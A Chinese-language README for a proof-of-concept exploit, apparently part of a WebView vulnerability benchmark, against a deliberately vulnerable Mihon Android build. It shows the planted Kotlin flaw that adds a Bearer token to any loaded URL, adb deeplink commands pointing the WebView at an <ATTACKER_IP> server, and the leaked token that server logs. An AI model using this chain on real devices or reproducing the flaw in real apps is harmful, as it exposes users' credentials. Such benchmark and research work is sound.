# 5.1 Cookie Leakage EXP

## 参考结构

本 EXP 复用 `exp/template` 的通用服务结构：

- `server.py`：启动 HTTP/HTTPS 服务，提供 `/exp/<vid>` 页面；本样本额外在 `/exp/5.1` 记录请求头。
- `exp/5.1.html`：攻击者控制的漫画源帮助页。
- `received/`：保存泄露到攻击者服务器的请求头。

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<external_url>` 会把外部可控 URL 转交给 `WebViewActivity`。漏洞样本在构造 headers 后无条件执行：

```kotlin
headers = headers.toMutableMap().apply {
    put("Authorization", "Bearer $sourceToken")
}
```

因此 WebView 初始加载任意攻击者 URL 时，都会通过 `loadUrl(url, headers)` 把 `Authorization: Bearer <source_token>` 发给攻击者服务器。该漏洞不依赖 JavaScript Bridge，也不需要页面脚本主动回传。

## 使用方式

1. 启动服务：

```powershell
cd "D:\WorkSpace\PhD\zeroth grade\WebViewGPT\WebViewBench\applist\exp\mihon-0.19.9\5.1_Cookie_Leakage"
python .\server.py
```

2. 记录 `server.py` 输出的本机 IP，例如 `10.201.103.217`。

3. 构造并打开 deeplink，其中 `<ATTACKER_IP>` 替换为上一步 IP：

```powershell
adb shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F<ATTACKER_IP>%3A8000%2Fexp%2F5.1"
```

如果设备上有多个 Mihon 构建，也可以指定包名：

```powershell
adb shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F<ATTACKER_IP>%3A8000%2Fexp%2F5.1" app.mihon.debug
```

## 预期结果

WebView 加载攻击页面后，服务端控制台会打印类似：

```text
-> 记录 5.1 请求头泄露: received/header_leak_<timestamp>.txt
Authorization: Bearer mihon-source-session-token
```

同时 `received/header_leak_<timestamp>.txt` 中会包含：

```text
authorization=Bearer mihon-source-session-token
```

这说明外部可控页面在首个 HTTP 请求中拿到了 Mihon 源站阅读认证凭据。

## 说明

EXP 只用于触发当前 5.1 样本的 Cookie/Header 泄露，不修改漏洞样本源码，不创建分支，不提交到 `vuln/` 或 `fix/` 分支，也不更新 `benchmark_samples.json`。
